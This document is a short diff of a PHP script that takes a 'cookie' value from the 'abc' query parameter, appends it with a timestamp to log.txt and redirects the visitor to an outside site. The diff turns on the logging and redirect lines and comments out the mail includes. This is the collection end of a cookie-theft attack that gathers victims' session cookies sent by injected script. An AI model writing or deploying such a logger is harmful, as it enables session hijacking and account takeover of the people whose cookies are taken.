@@ -1,13 +1,12 @@
 <?php
-include 'PHPMailer/class.smtp.php';
-include 'PHPMailer/class.phpmailer.php'; 
+// include 'PHPMailer/class.smtp.php';
+// include 'PHPMailer/class.phpmailer.php'; 
 
 if (isset($_GET["abc"])) {
     $cookie = $_GET["abc"];
     $f = open("log.txt", "a");
-    $t = date("Y-m-d");
-//     fwrite( $f, $t.":\n".$cookie."\n\n");
-//     header('Location: http://matxac.com/');
+    fwrite( $f, date("Y-m-d h:i:sa").":\n".$cookie."\n\n");
+    header('Location: http://matxac.com/');
     
 //     $sessionid = "";
 //     $user = "";
